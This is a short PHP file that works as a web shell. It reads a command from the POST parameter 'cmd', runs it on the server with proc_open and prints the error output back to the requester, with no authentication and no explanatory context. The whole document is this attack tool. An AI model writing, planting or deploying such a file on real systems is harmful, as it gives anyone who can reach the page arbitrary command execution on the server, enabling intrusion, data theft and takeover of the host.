<?php
$command = $_POST['cmd'];
$descriptorspec = array(
			   0 => array('pipe', 'r'),
			   1 => array('pipe', 'w'),
			   2 => array('pipe', 'w')
			);
$process = proc_open($command, $descriptorspec, $pipes);

fwrite($pipes[0], $command."\r\n");
fwrite($pipes[0], "exit\r\n");
fclose($pipes[0]);
fclose($pipes[1]);
while (!feof($pipes[2])) {
	echo fgets($pipes[2], 1024);
}
fclose($pipes[2]);
proc_close($process);
?>